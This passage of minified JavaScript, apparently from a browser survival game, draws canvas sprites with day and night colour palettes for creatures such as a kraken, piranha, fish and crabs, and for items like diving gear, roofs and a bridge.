        r.bezierCurveTo(e * 45, e * 143, e * 41, e * 151, e * 37, e * 162);
        r.bezierCurveTo(e * 48, e * 180, e * 58, e * 188, e * 76, e * 205);
        r.bezierCurveTo(e * 104, e * 209, e * 105, e * 229, e * 92, e * 235);
        r.bezierCurveTo(e * 76, e * 239, e * 75, e * 232, e * 56, e * 213);
        r.bezierCurveTo(e * 31, e * 187, e * 28, e * 176, e * 23, e * 162);
        r.bezierCurveTo(e * 38, e * 131, e * 40, e * 120, e * 44, e * 106);
        r.closePath();
        ye(r, i, i, e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 30, e * 159);
        r.bezierCurveTo(e * 46, e * 157, e * 59, e * 152, e * 68, e * 148);
        r.bezierCurveTo(e * 63, e * 155, e * 52, e * 160, e * 44, e * 164);
        r.bezierCurveTo(e * 59, e * 169, e * 66, e * 174, e * 75, e * 178);
        r.bezierCurveTo(e * 58, e * 178, e * 49, e * 175, e * 37, e * 174);
        r.closePath();
        ye(r, i);
        return t;
      }(0.8, "#BB0000"));
      sprite[Ie.HURT_WING_RIGHT] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 85;
        t.height = e * 145;
        r.translate(e * -165, e * -95);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 217, e * 103);
        r.bezierCurveTo(e * 209, e * 129, e * 203, e * 137, e * 195, e * 146);
        r.bezierCurveTo(e * 195, e * 159, e * 194, e * 167, e * 189, e * 178);
        r.bezierCurveTo(e * 193, e * 186, e * 196, e * 195, e * 198, e * 216);
        r.bezierCurveTo(e * 217.5, e * 189.5, e * 217.5, e * 189.5, e * 237, e * 163);
        r.closePath();
        ye(r, i);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 231, e * 163);
        r.bezierCurveTo(e * 221, e * 139, e * 218, e * 128, e * 215, e * 114);
        r.bezierCurveTo(e * 213, e * 102, e * 220, e * 92, e * 222, e * 107);
        r.bezierCurveTo(e * 224, e * 118, e * 233, e * 138, e * 244, e * 161);
        r.bezierCurveTo(e * 235, e * 188, e * 224, e * 198, e * 204, e * 221);
        r.bezierCurveTo(e * 190, e * 233, e * 190, e * 235, e * 180, e * 235);
        r.bezierCurveTo(e * 167, e * 235, e * 164, e * 216, e * 175, e * 211);
        r.bezierCurveTo(e * 176, e * 208, e * 181, e * 207, e * 191, e * 205);
        r.bezierCurveTo(e * 213, e * 186, e * 218, e * 180, e * 230, e * 163);
        r.closePath();
        ye(r, i, i, e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 234, e * 154);
        r.bezierCurveTo(e * 227, e * 156, e * 222, e * 156, e * 199, e * 148);
        r.bezierCurveTo(e * 201, e * 151, e * 216, e * 159, e * 224, e * 162);
        r.bezierCurveTo(e * 209, e * 169.5, e * 209, e * 169.5, e * 194, e * 177);
        r.bezierCurveTo(e * 213.5, e * 175, e * 213.5, e * 175, e * 233, e * 173);
        r.closePath();
        ye(r, i);
        return t;
      }(0.8, "#BB0000"));
      sprite[Ie.HURT_RABBIT] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        var n = e * 85;
        var a = e * 115;
        var o = e * 4;
        t.width = n;
        t.height = a;
        r.translate(e * -130, e * -60);
        r.globalAlpha = 1;
        r.beginPath();
        r.bezierCurveTo(e * 190, e * 87, e * 201, e * 59, e * 208, e * 64);
        r.bezierCurveTo(e * 213, e * 68, e * 204, e * 93, e * 195, e * 109);
        r.bezierCurveTo(e * 195, e * 109, e * 202, e * 124, e * 191, e * 141);
        r.bezierCurveTo(e * 182, e * 151, e * 164, e * 155, e * 148, e * 144);
        r.bezierCurveTo(e * 136, e * 135, e * 138, e * 111, e * 145, e * 104);
        r.bezierCurveTo(e * 140, e * 92, e * 131, e * 67, e * 138, e * 63);
        r.bezierCurveTo(e * 145, e * 61, e * 153, e * 82, e * 155, e * 96);
        r.bezierCurveTo(e * 167, e * 91, e * 178, e * 92, e * 187, e * 98);
        r.closePath();
        ye(r, i, i, o);
        return t;
      }(0.9, "#BB0000"));
      sprite[Ie.HURT] = te(Ue(0.6, "#BB0000"));
      sprite[Ie.COLD] = te(Ue(0.6, "#1CE7E0"));
      sprite[Ie.HUNGER] = te(Ue(0.6, "#DBE71C"));
      sprite[Ie.HEAL] = te(Ue(0.6, "#00BB00"));
      sprite[Ie.SAND_STEP] = [];
      sprite[Ie.SAND_STEP][Ie.DAY] = te(Er(1, ["#dac291"]));
      sprite[Ie.SAND_STEP][Ie.NIGHT] = te(Er(1, ["#0D423D"]));
      sprite[Ie.ISLAND_STEP] = [];
      sprite[Ie.ISLAND_STEP][Ie.DAY] = te(Er(1, ["#dac291"]));
      sprite[Ie.ISLAND_STEP][Ie.NIGHT] = te(Er(1, ["#0D423D"]));
      sprite[Ie.WELL_FULL] = [];
      sprite[Ie.WELL_FULL][Ie.DAY] = te(xr(0.3, true, ["#1e2021", "#717273", "#606162", "#a09f9f", "#878787", "#1a6470"]));
      sprite[Ie.WELL_FULL][Ie.NIGHT] = te(xr(0.3, true, ["#1e2021", "#1a4545", "#163a3a", "#245d5d", "#1f5454", "#09373F"]));
      sprite[Ie.WELL_EMPTY] = [];
      sprite[Ie.WELL_EMPTY][Ie.DAY] = te(xr(0.3, true, ["#1e2021", "#717273", "#606162", "#a09f9f", "#878787", "#454545"]));
      sprite[Ie.WELL_EMPTY][Ie.NIGHT] = te(xr(0.3, true, ["#1e2021", "#1a4545", "#163a3a", "#245d5d", "#1f5454", "#0b2121"]));
      sprite[Ie.BOTTLE_FULL] = [te(on(1, 0, ["#C6AF81", "#C98435", "#B26F31", "#53A4D5", "#388AC7", "#C1C0C0", "#EAEAEA"]))];
      sprite[Ie.BOTTLE_EMPTY] = [te(on(1, 0, ["#C6AF81", "#C98435", "#B26F31", "#53A4D5", "#388AC7", "#C1C0C0", "#EAEAEA"]))];
      sprite[Ie.OCEAN] = [];
      sprite[Ie.OCEAN][Ie.DAY] = [];
      sprite[Ie.OCEAN][Ie.NIGHT] = [];
      sprite[Ie.OCEAN][Ie.DAY].push(te(tr(1, ["#0B6A84"])));
      sprite[Ie.OCEAN][Ie.DAY].push(te(rr(1, ["#0B6A84"])));
      sprite[Ie.OCEAN][Ie.DAY].push(te(nr(1, ["#0B6A84"])));
      sprite[Ie.OCEAN][Ie.DAY].push(te(ar(1, ["#0B6A84"])));
      sprite[Ie.OCEAN][Ie.DAY].push(te(or(1, ["#0B6A84"])));
      sprite[Ie.OCEAN][Ie.DAY].push(te(sr(1, ["#0B6A84"])));
      sprite[Ie.OCEAN][Ie.DAY].push(te(_r(1, ["#0B6A84"])));
      sprite[Ie.OCEAN][Ie.NIGHT].push(te(tr(1, ["#09373F"])));
      sprite[Ie.OCEAN][Ie.NIGHT].push(te(rr(1, ["#09373F"])));
      sprite[Ie.OCEAN][Ie.NIGHT].push(te(nr(1, ["#09373F"])));
      sprite[Ie.OCEAN][Ie.NIGHT].push(te(ar(1, ["#09373F"])));
      sprite[Ie.OCEAN][Ie.NIGHT].push(te(or(1, ["#09373F"])));
      sprite[Ie.OCEAN][Ie.NIGHT].push(te(sr(1, ["#09373F"])));
      sprite[Ie.OCEAN][Ie.NIGHT].push(te(_r(1, ["#09373F"])));
      sprite[Ie.ISLAND] = [];
      sprite[Ie.ISLAND][Ie.DAY] = [];
      sprite[Ie.ISLAND][Ie.NIGHT] = [];
      sprite[Ie.ISLAND][Ie.DAY].push(te(xt(1.7, ["#FBEFBC"], 0)));
      sprite[Ie.ISLAND][Ie.DAY].push(te(xt(1.9, ["#FBEFBC"], 1)));
      sprite[Ie.ISLAND][Ie.DAY].push(te(xt(1.7, ["#FBEFBC"], 2)));
      sprite[Ie.ISLAND][Ie.NIGHT].push(te(xt(1.7, ["#0F4C48"], 0)));
      sprite[Ie.ISLAND][Ie.NIGHT].push(te(xt(1.9, ["#0F4C48"], 1)));
      sprite[Ie.ISLAND][Ie.NIGHT].push(te(xt(1.7, ["#0F4C48"], 2)));
      sprite[Ie.WAVE_ONE] = [];
      sprite[Ie.WAVE_ONE][Ie.DAY] = [];
      sprite[Ie.WAVE_ONE][Ie.NIGHT] = [];
      sprite[Ie.WAVE_ONE][Ie.DAY].push(te(xt(1.8, ["#A9D6D3"], 0)));
      sprite[Ie.WAVE_ONE][Ie.DAY].push(te(xt(2, ["#A9D6D3"], 1)));
      sprite[Ie.WAVE_ONE][Ie.DAY].push(te(xt(1.8, ["#A9D6D3"], 2)));
      sprite[Ie.WAVE_ONE][Ie.NIGHT].push(te(xt(1.8, ["#115E60"], 0)));
      sprite[Ie.WAVE_ONE][Ie.NIGHT].push(te(xt(2, ["#115E60"], 1)));
      sprite[Ie.WAVE_ONE][Ie.NIGHT].push(te(xt(1.8, ["#115E60"], 2)));
      sprite[Ie.WAVE_TWO] = [];
      sprite[Ie.WAVE_TWO][Ie.DAY] = [];
      sprite[Ie.WAVE_TWO][Ie.NIGHT] = [];
      sprite[Ie.WAVE_TWO][Ie.DAY].push(te(xt(1.9, ["#2A8B9B"], 0)));
      sprite[Ie.WAVE_TWO][Ie.DAY].push(te(xt(2.1, ["#2A8B9B"], 1)));
      sprite[Ie.WAVE_TWO][Ie.DAY].push(te(xt(1.9, ["#2A8B9B"], 2)));
      sprite[Ie.WAVE_TWO][Ie.NIGHT].push(te(xt(1.9, ["#0F464C"], 0)));
      sprite[Ie.WAVE_TWO][Ie.NIGHT].push(te(xt(2.1, ["#0F464C"], 1)));
      sprite[Ie.WAVE_TWO][Ie.NIGHT].push(te(xt(1.9, ["#0F464C"], 2)));
      sprite[Ie.PALM] = [];
      sprite[Ie.PALM][Ie.DAY] = [];
      sprite[Ie.PALM][Ie.NIGHT] = [];
      sprite[Ie.PALM][Ie.DAY].push(te(It(0.8, ["#231F20", "#0c8e5b", "#037542", "#077b49"])));
      sprite[Ie.PALM][Ie.DAY].push(te(It(1, ["#231F20", "#0c8e5b", "#037542", "#077b49"])));
      sprite[Ie.PALM][Ie.DAY].push(te(It(1.2, ["#231F20", "#0c8e5b", "#037542", "#077b49"])));
      sprite[Ie.PALM][Ie.NIGHT].push(te(It(0.8, ["#041e22", "#124949", "#0e3838", "#0a4049"])));
      sprite[Ie.PALM][Ie.NIGHT].push(te(It(1, ["#041e22", "#124949", "#0e3838", "#0a4049"])));
      sprite[Ie.PALM][Ie.NIGHT].push(te(It(1.2, ["#041e22", "#124949", "#0e3838", "#0a4049"])));
      sprite[Ie.KRAKEN] = [];
      sprite[Ie.KRAKEN][Ie.DAY] = te(wr(0.8, ["#1e2021", "#B6222A", "#201851", "#342C7C", "#F4F4F4", "#D3D3D3", "#6765CE", "#593CC6", "#433BAD", "#342C7C", "#052830", "#EAEAEA", "#B6222A", "#FFFFFF"]));
      sprite[Ie.KRAKEN][Ie.NIGHT] = te(wr(0.8, ["#0c0c0d", "#462966", "#081B2D", "#342C7C", "#9AAAAD", "#72898C", "#133556", "#296D9B", "#25557C", "#133556", "#0D2A42", "#EAEAEA", "#462966", "#72898C"]));
      sprite[Ie.HURT_KRAKEN] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 376;
        t.height = e * 371;
        r.globalAlpha = 1;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 191.633544921875, e * 123.98580932617188);
        r.bezierCurveTo(e * 215.633544921875, e * 85.98580932617188, e * 187.633544921875, e * 71.98580932617188, e * 202.633544921875, e * 19.985809326171875);
        r.bezierCurveTo(e * 231.633544921875, e * 68.98580932617188, e * 253.633544921875, e * 71.98580932617188, e * 256.633544921875, e * 93.98580932617188);
        r.bezierCurveTo(e * 306.633544921875, e * 64.98580932617188, e * 319.633544921875, e * 61.985809326171875, e * 350.633544921875, e * 58.985809326171875);
        r.bezierCurveTo(e * 280.633544921875, e * 86.98580932617188, e * 281.633544921875, e * 106.98580932617188, e * 268.633544921875, e * 130.98580932617188);
        r.bezierCurveTo(e * 295.633544921875, e * 158.98580932617188, e * 328.633544921875, e * 155.98580932617188, e * 353.633544921875, e * 90.98580932617188);
        r.bezierCurveTo(e * 371.633544921875, e * 158.98580932617188, e * 337.633544921875, e * 210.98580932617188, e * 286.633544921875, e * 209.98580932617188);
        r.bezierCurveTo(e * 323.633544921875, e * 230.98580932617188, e * 317.633544921875, e * 274.9858093261719, e * 356.633544921875, e * 305.9858093261719);
        r.bezierCurveTo(e * 288.633544921875, e * 297.9858093261719, e * 288.633544921875, e * 265.9858093261719, e * 275.633544921875, e * 266.9858093261719);
        r.bezierCurveTo(e * 280.633544921875, e * 294.9858093261719, e * 315.633544921875, e * 306.9858093261719, e * 336.633544921875, e * 316.9858093261719);
        r.bezierCurveTo(e * 295.633544921875, e * 318.9858093261719, e * 264.633544921875, e * 302.9858093261719, e * 254.633544921875, e * 289.9858093261719);
        r.bezierCurveTo(e * 252.633544921875, e * 301.9858093261719, e * 224.633544921875, e * 315.9858093261719, e * 201.633544921875, e * 356.9858093261719);
        r.bezierCurveTo(e * 195.633544921875, e * 313.9858093261719, e * 195.633544921875, e * 308.9858093261719, e * 196.633544921875, e * 307.9858093261719);
        r.bezierCurveTo(e * 197.633544921875, e * 289.9858093261719, e * 207.633544921875, e * 283.9858093261719, e * 195.633544921875, e * 258.9858093261719);
        r.bezierCurveTo(e * 182.633544921875, e * 282.9858093261719, e * 190.633544921875, e * 287.9858093261719, e * 193.633544921875, e * 297.9858093261719);
        r.bezierCurveTo(e * 195.633544921875, e * 306.9858093261719, e * 191.633544921875, e * 334.9858093261719, e * 187.633544921875, e * 354.9858093261719);
        r.bezierCurveTo(e * 165.633544921875, e * 320.9858093261719, e * 138.633544921875, e * 307.9858093261719, e * 135.633544921875, e * 288.9858093261719);
        r.bezierCurveTo(e * 110.633544921875, e * 318.9858093261719, e * 68.633544921875, e * 323.9858093261719, e * 49.633544921875, e * 320.9858093261719);
        r.bezierCurveTo(e * 88.633544921875, e * 308.9858093261719, e * 108.633544921875, e * 284.9858093261719, e * 118.633544921875, e * 258.9858093261719);
        r.bezierCurveTo(e * 86.633544921875, e * 264.9858093261719, e * 75.633544921875, e * 310.9858093261719, e * 19.633544921875, e * 304.9858093261719);
        r.bezierCurveTo(e * 54.633544921875, e * 276.9858093261719, e * 59.633544921875, e * 214.98580932617188, e * 105.633544921875, e * 205.98580932617188);
        r.bezierCurveTo(e * 14.633544921875, e * 201.98580932617188, e * 24.633544921875, e * 141.98580932617188, e * 25.633544921875, e * 82.98580932617188);
        r.bezierCurveTo(e * 49.633544921875, e * 168.98580932617188, e * 87.633544921875, e * 141.98580932617188, e * 112.633544921875, e * 123.98580932617188);
        r.bezierCurveTo(e * 95.633544921875, e * 75.98580932617188, e * 70.633544921875, e * 68.98580932617188, e * 35.633544921875, e * 50.985809326171875);
        r.bezierCurveTo(e * 70.633544921875, e * 53.985809326171875, e * 102.633544921875, e * 65.98580932617188, e * 125.633544921875, e * 84.98580932617188);
        r.bezierCurveTo(e * 133.633544921875, e * 69.98580932617188, e * 166.633544921875, e * 42.985809326171875, e * 176.633544921875, e * 21.985809326171875);
        r.bezierCurveTo(e * 185.633544921875, e * 49.985809326171875, e * 168.633544921875, e * 95.98580932617188, e * 191.633544921875, e * 121.98580932617188);
        r.closePath();
        ye(r, i[0], i[0], e * 12);
        return t;
      }(0.8, ["#B6222A"]));
      sprite[Ie.PIRANHA] = [];
      sprite[Ie.PIRANHA][Ie.DAY] = te(Zr(0.8, 0, ["#1e2021", "#961B1B", "#702727", "#C43B3B", "#d15151", "#B71C1C", "#E8E8E8", "#752E2E", "#891818"]));
      sprite[Ie.PIRANHA][Ie.NIGHT] = te(Zr(0.8, 0, ["#0c0c0d", "#21112D", "#281A49", "#462966", "#321C56", "#1C073D", "#FFFFFF", "#1C0833", "#1B1238"]));
      sprite[Ie.HURT_PIRANHA] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 158;
        t.height = e * 201;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 96.5, e * 76.421875);
        r.bezierCurveTo(e * 100.5, e * 64.421875, e * 103.5, e * 62.421875, e * 110.5, e * 65.421875);
        r.bezierCurveTo(e * 116.5, e * 66.421875, e * 117.5, e * 67.421875, e * 112.5, e * 73.421875);
        r.bezierCurveTo(e * 107, e * 79.921875, e * 107, e * 79.921875, e * 101.5, e * 86.421875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 61.5, e * 78.421875);
        r.bezierCurveTo(e * 57.5, e * 73.421875, e * 51.5, e * 66.421875, e * 45.5, e * 68.421875);
        r.bezierCurveTo(e * 32.5, e * 73.421875, e * 38.5, e * 75.421875, e * 46.5, e * 81.421875);
        r.bezierCurveTo(e * 51.5, e * 84.921875, e * 51.5, e * 84.921875, e * 56.5, e * 88.421875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 116.5, e * 127.421875);
        r.bezierCurveTo(e * 124.5, e * 108.421875, e * 129.5, e * 104.421875, e * 141.5, e * 107.421875);
        r.bezierCurveTo(e * 156.5, e * 112.421875, e * 153.5, e * 113.421875, e * 132.5, e * 134.421875);
        r.bezierCurveTo(e * 123.5, e * 141.921875, e * 123.5, e * 141.921875, e * 114.5, e * 149.421875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 41.5, e * 134.421875);
        r.bezierCurveTo(e * 30.5, e * 119.421875, e * 25.5, e * 111.421875, e * 12.5, e * 115.421875);
        r.bezierCurveTo(e * 4.5, e * 120.421875, e * 4.5, e * 121.421875, e * 26.5, e * 142.421875);
        r.bezierCurveTo(e * 35, e * 149.921875, e * 35, e * 149.921875, e * 43.5, e * 157.421875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 78.5, e * 51.921875);
        r.bezierCurveTo(e * 99.5, e * 75.921875, e * 110.5, e * 96.921875, e * 118.5, e * 120.921875);
        r.bezierCurveTo(e * 121.5, e * 140.921875, e * 107.5, e * 179.921875, e * 75.5, e * 183.921875);
        r.bezierCurveTo(e * 30.5, e * 169.921875, e * 37.5, e * 131.921875, e * 34.5, e * 120.921875);
        r.bezierCurveTo(e * 41.5, e * 89.921875, e * 61.5, e * 67.921875, e * 78.5, e * 51.921875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 72.5, e * 72.421875);
        r.bezierCurveTo(e * 76.5, e * 79.421875, e * 79.5, e * 80.421875, e * 83.5, e * 73.421875);
        r.bezierCurveTo(e * 80.5, e * 96.921875, e * 79.5, e * 114.421875, e * 77.5, e * 120.421875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 42.5, e * 163.421875);
        r.bezierCurveTo(e * 62.5, e * 185.421875, e * 86.5, e * 186.421875, e * 111.5, e * 165.421875);
        r.bezierCurveTo(e * 107.5, e * 176.421875, e * 95.5, e * 187.421875, e * 75.5, e * 188.421875);
        r.bezierCurveTo(e * 53.5, e * 188.421875, e * 43.5, e * 171.421875, e * 42.5, e * 164.421875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 79.5, e * 61.421875);
        r.bezierCurveTo(e * 88.5, e * 31.421875, e * 81.5, e * 16.421875, e * 75.5, e * 7.421875);
        r.bezierCurveTo(e * 77.5, e * 28.421875, e * 77.5, e * 37.421875, e * 68.5, e * 42.421875);
        r.bezierCurveTo(e * 79.5, e * 57.421875, e * 79.5, e * 58.421875, e * 80.5, e * 61.421875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 72.5, e * 72.421875);
        r.bezierCurveTo(e * 76.5, e * 79.421875, e * 79.5, e * 80.421875, e * 83.5, e * 73.421875);
        r.bezierCurveTo(e * 80.5, e * 96.921875, e * 79.5, e * 114.421875, e * 77.5, e * 120.421875);
        r.closePath();
        ye(r, i[0], i[0], e * 10);
        return t;
      }(0.8, ["#B6222A"]));
      sprite[Ie.FISH1] = [];
      sprite[Ie.FISH1][Ie.DAY] = te($e(0.4, 0, ["#1e2021", "#db6f26", "#ffffff", "#000000", "#833813"], 0));
      sprite[Ie.FISH1][Ie.NIGHT] = te($e(0.4, 0, ["#0c0c0d", "#21112D", "#281A49", "#462966"], 0));
      sprite[Ie.FISH2] = [];
      sprite[Ie.FISH2][Ie.DAY] = te($e(0.4, 0, ["#1e2021", "#d35e35", "#ffffff", "#000000", "#000000"], 1));
      sprite[Ie.FISH2][Ie.NIGHT] = te($e(0.4, 0, ["#0c0c0d", "#21112D", "#281A49", "#462966"], 1));
      sprite[Ie.FISH3] = [];
      sprite[Ie.FISH3][Ie.DAY] = te($e(0.4, 0, ["#1e2021", "#2973a5", "#ffffff", "#ffff00", "#000000", "#03243f", "#f2ec30", "#162f6d"], 0));
      sprite[Ie.FISH3][Ie.NIGHT] = te($e(0.4, 0, ["#0c0c0d", "#21112D", "#281A49", "#462966"], 0));
      sprite[Ie.HURT_FISH1] = te(ei(0.4, ["#B6222A"]));
      sprite[Ie.HURT_FISH2] = te(ei(0.4, ["#B6222A"]));
      sprite[Ie.HURT_FISH3] = te(ei(0.4, ["#B6222A"]));
      sprite[Ie.CRAB_LOOT] = te(pt(0.35, true, ["#0d1b1c", "#c04933", "#a33e2b", "#ee593d", "#c04933"]));
      sprite[Ie.CRAB_STICK] = te(Ui(0.35, true, ["#1e2021", "#ed5f4f", "#ce4545", "#ffffff", "#e2dad7"]));
      sprite[Ie.CRAB_ATTACK] = [];
      sprite[Ie.CRAB_ATTACK][Ie.DAY] = te(Wi(0.35, 0, ["#1e2021", "#e45936", "#B6222A", "#B6222A", "#FFFFFF"], 1));
      sprite[Ie.CRAB_ATTACK][Ie.NIGHT] = te(Wi(0.35, 0, ["#0c0c0d", "#613577", "#462966", "#1C073D", "#FFFFFF"], 1));
      sprite[Ie.CRAB] = [];
      sprite[Ie.CRAB][Ie.DAY] = te(Wi(0.35, 0, ["#1e2021", "#e45936", "#ffffff", "#181414", "#FFFFFF"], 0));
      sprite[Ie.CRAB][Ie.NIGHT] = te(Wi(0.35, 0, ["#0c0c0d", "#34255d", "#563f83", "#180f21", "#FFFFFF"], 0));
      sprite[Ie.CRAB_CLAW_LEFT] = [];
      sprite[Ie.CRAB_CLAW_LEFT][Ie.DAY] = te(wi(0.35, 0, ["#1e2021", "#e45936", "#ffffff"]));
      sprite[Ie.CRAB_CLAW_LEFT][Ie.NIGHT] = te(wi(0.35, 0, ["#0c0c0d", "#34255d", "#563f83"]));
      sprite[Ie.CRAB_CLAW_RIGHT] = [];
      sprite[Ie.CRAB_CLAW_RIGHT][Ie.DAY] = te(Ki(0.42, 0, ["#1e2021", "#e45936", "#ffffff"]));
      sprite[Ie.CRAB_CLAW_RIGHT][Ie.NIGHT] = te(Ki(0.42, 0, ["#0c0c0d", "#34255d", "#563f83"]));
      sprite[Ie.CRAB_CLAW_LEFT_ATTACK] = [];
      sprite[Ie.CRAB_CLAW_LEFT_ATTACK][Ie.DAY] = te(wi(0.35, 0, ["#1e2021", "#e45936", "#B6222A"]));
      sprite[Ie.CRAB_CLAW_LEFT_ATTACK][Ie.NIGHT] = te(wi(0.35, 0, ["#0c0c0d", "#613577", "#462966"]));
      sprite[Ie.CRAB_CLAW_RIGHT_ATTACK] = [];
      sprite[Ie.CRAB_CLAW_RIGHT_ATTACK][Ie.DAY] = te(Ki(0.42, 0, ["#1e2021", "#e45936", "#B6222A"]));
      sprite[Ie.CRAB_CLAW_RIGHT_ATTACK][Ie.NIGHT] = te(Ki(0.42, 0, ["#0c0c0d", "#613577", "#462966"]));
      sprite[Ie.HURT_CRAB] = te(Vi(0.35, ["#B6222A"]));
      sprite[Ie.HURT_CRAB_CLAW_LEFT] = te(wi(0.35, 0, [undefined, "#B6222A"]));
      sprite[Ie.HURT_CRAB_CLAW_RIGHT] = te(Ki(0.35, 0, [undefined, "#B6222A"]));
      sprite[Ie.HEAL_CRAB] = te(Vi(0.35, ["#22E066"]));
      sprite[Ie.HEAL_CRAB_CLAW_LEFT] = te(wi(0.35, 0, [undefined, "#22E066"]));
      sprite[Ie.HEAL_CRAB_CLAW_RIGHT] = te(Ki(0.35, 0, [undefined, "#22E066"]));
      sprite[Ie.DIVING_MASK] = [];
      sprite[Ie.DIVING_MASK][Ie.DAY] = te(st(0.3, true, ["#1e2021", "#65A8B7", "#2E85A0", "#14275B", "#081826", "#1A3163", "#0C1944", "#89C4CE", "#2E85A0"]));
      sprite[Ie.DIVING_MASK][Ie.NIGHT] = te(st(0.3, true, ["#0c0c0d", "#89C9C7", "#469E95", "#092C38", "#072021", "#0E343D", "#071F2D", "#9FD3D3", "#135367"]));
      sprite[Ie.SUPER_DIVING_SUIT] = [];
      sprite[Ie.SUPER_DIVING_SUIT][Ie.DAY] = te(_t(0.45, true, ["#C4BC51", "#B29C32", "#201851", "#652D8E", "#1e2021", "#2E85A0"]));
      sprite[Ie.SUPER_DIVING_SUIT][Ie.NIGHT] = te(_t(0.45, true, ["#235050", "#357472", "#081B2D", "#342C7C", "#0c0c0d", "#135367"]));
      sprite[Ie.PLOT] = [];
      sprite[Ie.PLOT][Ie.DAY] = te(qr(0.63, true, ["#1e2021", "#352E1E", "#4C3B19", "#574122"]));
      sprite[Ie.PLOT][Ie.NIGHT] = te(qr(0.63, true, ["#0c0c0d", "#071f22", "#0d2e33", "#184747"]));
      sprite[Ie.BRIDGE] = [];
      sprite[Ie.BRIDGE][Ie.DAY] = te(Fr(1, true, ["#1e2021", "#332715", "#4C3B19", "#574122"]));
      sprite[Ie.BRIDGE][Ie.NIGHT] = te(Fr(1, true, ["#0c0c0d", "#071f22", "#0d2e33", "#184747"]));
      sprite[Ie.WOOD_TOWER] = [];
      sprite[Ie.WOOD_TOWER][Ie.DAY] = IMAGES.WOOD_TOWERD;
      sprite[Ie.WOOD_TOWER][Ie.NIGHT] = IMAGES.WOOD_TOWERN;
      sprite[Ie.ROOF] = [];
      sprite[Ie.ROOF][Ie.DAY] = te(xe(0.59, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
      sprite[Ie.ROOF][Ie.NIGHT] = te(xe(0.59, 0, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
      sprite[Ie.ROOFS] = [sprite[Ie.ROOF]];
      sprite[Ie.ROOFS][1] = [];
      sprite[Ie.ROOFS][2] = [];
      sprite[Ie.ROOFS][1][Ie.DAY] = te(Je(0.59, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
      sprite[Ie.ROOFS][1][Ie.NIGHT] = te(Je(0.59, 0, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
      sprite[Ie.ROOFS][2][Ie.DAY] = te(Xe(0.59, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
      sprite[Ie.ROOFS][2][Ie.NIGHT] = te(Xe(0.59, 0, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
      sprite[Ie.WATERING_CAN_FULL] = [];
      sprite[Ie.WATERING_CAN_FULL][Ie.DAY] = te(we(3 - Math.PI / 2, jr(0.6, true, ["#1e2021", "#674C2A", "#4C3B19", "#594225", "#1678a2"])));
      sprite[Ie.WATERING_CAN_FULL][Ie.NIGHT] = te(we(3 - Math.PI / 2, jr(0.6, true, ["#0c0c0d", "#07383c", "#0c4e53", "#042b2e", "#0c5975", "#11546c"])));
      sprite[Ie.DEAD_BOX] = [];
      sprite[Ie.DEAD_BOX][Ie.DAY] = te(Ei(0.3, ["#ad8850", "#714f24", "#9f7d4a", "#b38e59", "#8b1008"], 0));
      sprite[Ie.DEAD_BOX][Ie.NIGHT] = te(Ei(0.3, ["#1F5453", "#123335", "#1D4947", "#1F5453", "#0c2629"], 0));
      sprite[Ie.DEAD_BOX_UI] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 650;
        t.height = e * 650;
        r.scale(1.9, 1.9);
        r.save();
        r.translate(e * 202.5, e * 147.5);
        Be(r, e * -96.5, e * -21.5, e * 193, e * 193, e * 0);
        r.restore();
        ye(r, i[4], i[1], e * 12);
        r.save();
        r.translate(e * 203.5, e * 121.5);
        Be(r, e * -115.5, e * -20.5, e * 231, e * 41, e * 10);
        r.restore();
        ye(r, i[3], i[1], e * 12);
        r.save();
        r.translate(e * 203.5, e * 299);
        Be(r, e * -115.5, e * -20, e * 231, e * 40, e * 10);
        r.restore();
        ye(r, i[3], i[1], e * 12);
        r.save();
        r.translate(e * 298.5, e * 210);
        Be(r, e * -20.5, e * -109, e * 41, e * 218, e * 10);
        r.restore();
        ye(r, i[3], i[1], e * 12);
        r.save();
        r.translate(e * 108.5, e * 210);
        Be(r, e * -20.5, e * -109, e * 41, e * 218, e * 10);
        r.restore();
        ye(r, i[3], i[1], e * 12);
        r.save();
        r.translate(e * 204, e * 121.5);
        Be(r, e * -92, e * -9.5, e * 184, e * 19, e * 10);
        r.restore();
        ye(r, i[3], i[3], e * 10);
        r.save();
        r.translate(e * 197, e * 299);
